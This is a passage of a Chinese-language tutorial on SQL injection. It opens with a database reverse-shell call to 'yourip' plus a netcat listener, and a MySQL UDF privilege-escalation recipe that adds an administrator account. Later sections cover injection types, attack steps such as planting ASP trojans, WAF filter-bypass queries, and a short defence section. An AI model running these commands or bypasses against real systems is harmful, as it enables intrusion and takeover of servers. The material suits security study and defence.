&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yourip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;2、本地监听你反弹的端口&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2010     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;成功后，你将获得一个 system 权限的 cmdshell&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mysql udf 提权&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;目录位置:&lt;/p&gt;

&lt;p&gt;c:\windows\system32&lt;/p&gt;

&lt;p&gt;1、最常见的是直接使用 udf.php (https://download.csdn.net/download/fly_hps/10752511 ) 此类的工具来执行 udf 提权&lt;/p&gt;

&lt;p&gt;具体如下:&lt;/p&gt;

&lt;p&gt;连接到 mysql 以后，先导出 udf.dll 到 c:\windows\system32 目录下。&lt;/p&gt;

&lt;p&gt;2、创建相应的函数并执行命令，具体如下：&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;soname&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'udf.dll'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'net user wintry wintry /add'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'net localgroup administrators wintry /add'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;drop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmdshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmdshell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;sql注入总结&quot;&gt;sql注入总结&lt;/h3&gt;
&lt;p&gt;####总体见解：
1.只要是支持批处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。&lt;br /&gt;
2.注入的本质，是把用户输入数据作为代码执行。有两个关键条件：第一个是用户能控制输入；第二是原本程序要执行的代码，拼接了用户输入的数据，把数据当代码执行了。（出自吴瀚清《白帽子讲WEB安全》）&lt;br /&gt;
3.错误的回显是敏感信息，是攻击者了解某网站web服务器的重要手段。&lt;br /&gt;
4.最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，判断SQL语句是否得到执行。例如http://a.b.c/item.php?id=2中，执行的SQL为：select title,body FROM item where ID =2可以 将域名改为http://a.b.c/item.php?id=2or 1=1，通过注入数据，再对返回页面进行差异结果比较。两次结果不一样，证明存在注入漏洞。&lt;br /&gt;
####SQL注入原理：&lt;br /&gt;
SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）&lt;/p&gt;
&lt;h3 id=&quot;sql注入漏洞常见类型&quot;&gt;SQL注入漏洞常见类型：&lt;/h3&gt;
&lt;p&gt;1.没有正确过滤转义字符 &lt;br /&gt;
2.Incorrecttypehandling &lt;br /&gt;
3.数据库服务器中的漏洞 &lt;br /&gt;
4.盲目SQL注入式攻击&lt;br /&gt;
5.条件响应&lt;br /&gt;
6.条件性差错&lt;br /&gt;
7.时间延误&lt;/p&gt;
&lt;h3 id=&quot;sql注入点的类型&quot;&gt;SQL注入点的类型：&lt;/h3&gt;
&lt;p&gt;1，数字型注入点&lt;br /&gt;
2，字符型注入点&lt;br /&gt;
3，搜索型注入点：&lt;br /&gt;
这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。&lt;br /&gt;
SQL注入原因：&lt;br /&gt;
①不当的类型处理；&lt;br /&gt;
②不安全的数据库配置；&lt;br /&gt;
③不合理的查询集处理；&lt;br /&gt;
④不当的错误处理；&lt;br /&gt;
⑤转义字符处理不合适；&lt;br /&gt;
⑥多个提交处理不当。&lt;/p&gt;
&lt;h3 id=&quot;sql注入一般步骤&quot;&gt;SQL注入一般步骤：&lt;/h3&gt;
&lt;p&gt;发现SQL注入位置；&lt;br /&gt;
·判断环境，寻找注入点，判断数据库类型；  &lt;br /&gt;
其次，根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种： &lt;br /&gt;
(A) ID=49这类注入的参数是数字型， &lt;br /&gt;
SQL语句原貌大致如下：Select * from表名where字段=49注入的参数为ID=49 And [查询条件]，即是生成语句：Select * from表名where字段=49 And [查询条件] &lt;br /&gt;
(B) Class=连续剧这类注入的参数是字符型， &lt;br /&gt;
SQL语句原貌大致概如下：Select * from表名where字段=’连续剧’注入的参数为Class=连续剧’ and [查询条件]and‘’=’，即是生成语句：Select * from表名where字段=’连续剧’ and [查询条件] and‘’=’’ &lt;br /&gt;
(C)搜索时没过滤参数的， &lt;br /&gt;
如keyword=关键字，SQL语句原貌大致如下：Select * from表名where字段like ’%关键字%’注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即是生成语句：Select * from表名where字段like ’%’ and [查询条件]and‘%’=’%’·发现WEB虚拟目录，将查询条件替换成SQL语句，猜解表名，猜列名，猜目标目录的字段长度。&lt;/p&gt;
&lt;h3 id=&quot;数据库攻击常用技巧&quot;&gt;数据库攻击常用技巧：&lt;/h3&gt;
&lt;p&gt;猜表名，确认表名，列名&lt;br /&gt;
·上传ASP木马，留下后门；&lt;br /&gt;
·得到管理员权限，窃取数据；&lt;br /&gt;
ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？&lt;br /&gt;
提升权限的方法有很多种：&lt;br /&gt;
上传木马，修改开机自动运行的.ini文件（它一重启，便死定了）；&lt;br /&gt;
复制CMD.exe到scripts，人为制造UNICODE漏洞；下载SAM文件，破解并获取OS的所有用户名密码；   等等，视系统的具体情况而定，可以采取不同的方法。&lt;/p&gt;
&lt;h3 id=&quot;如何判断sqli注入有哪些方法&quot;&gt;如何判断sqli注入，有哪些方法？&lt;/h3&gt;
&lt;p&gt;添加单引号，双引号，order by, sleep，benchmark，运算符，修改数据类型，报错注入语句测试&lt;/p&gt;
&lt;h3 id=&quot;mysql的用户名密码是放在哪张表里面&quot;&gt;mysql的用户名密码是放在哪张表里面？&lt;/h3&gt;
&lt;p&gt;mysql数据库下的user表。&lt;/p&gt;

&lt;h3 id=&quot;sql注入过滤绕过总结&quot;&gt;sql注入过滤绕过总结&lt;/h3&gt;
&lt;h4 id=&quot;注释符号绕过&quot;&gt;注释符号绕过：&lt;/h4&gt;
&lt;p&gt;常用的注释符有&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;注释内容&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# 注释内容&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/*注释内容*/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;大小写绕过&quot;&gt;大小写绕过：&lt;/h4&gt;
&lt;p&gt;常用于waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。&lt;br /&gt;
例如：waf过滤了关键字select，可以尝试使用Select等绕过。&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.00&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#大小写绕过&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;---------------------&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;内联注释绕过&quot;&gt;内联注释绕过:&lt;/h4&gt;
&lt;p&gt;内联注释就是把一些特有的仅在MYSQL上的语句放在 /&lt;em&gt;!…&lt;/em&gt;/中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*!select*/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;---------------------&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;双写关键字绕过&quot;&gt;双写关键字绕过:&lt;/h4&gt;
&lt;p&gt;在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。&lt;/p&gt;
&lt;h4 id=&quot;特殊编码绕过&quot;&gt;特殊编码绕过:&lt;/h4&gt;
&lt;p&gt;十六进制绕过&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7465737431&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;test1&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+----+----------+----------+&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ascii编码绕过&lt;br /&gt;
Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)&lt;br /&gt;
tip:好像新版mysql不能用了&lt;/p&gt;
&lt;h4 id=&quot;空格过滤绕过&quot;&gt;空格过滤绕过:&lt;/h4&gt;
&lt;p&gt;一般绕过空格过滤的方法有以下几种方法来取代空格&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;回车&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url编码中的&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tap键上面的按钮&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;tap&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;两个空格&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;实例:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*/**/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#注意括号中不能含有*  &lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;from&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;users&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;where&lt;/span&gt; 
    &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`id`&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`users`&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`id`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;过滤or-and-xor-not-绕过&quot;&gt;过滤or and xor not 绕过:&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;and = &amp;amp;&amp;amp;&lt;br /&gt;
or = ||&lt;br /&gt;
xor = | # 异或&lt;br /&gt;
not = !&lt;/p&gt;
  &lt;h4 id=&quot;过滤等号绕过&quot;&gt;过滤等号=绕过&lt;/h4&gt;
  &lt;p&gt;#####不加通配符的like执行的效果和=一致，所以可以用来绕过。&lt;br /&gt;
正常加上通配符的like：&lt;/p&gt;
  &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test%&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
  &lt;p&gt;#####使用大小于号来绕过：&lt;/p&gt;
  &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
  &lt;h3 id=&quot;如何防御sql漏洞&quot;&gt;如何防御SQL漏洞？&lt;/h3&gt;
  &lt;p&gt;核心原则：数据代码分离原则。 
1.最佳方法：预编译语句，绑定变量。使用预编译的SQL语句，SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’=’1的字符串，也只会将此字符串作为username查询。 
2.从存储过程来防御：先将SQL语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态SQL语句。 
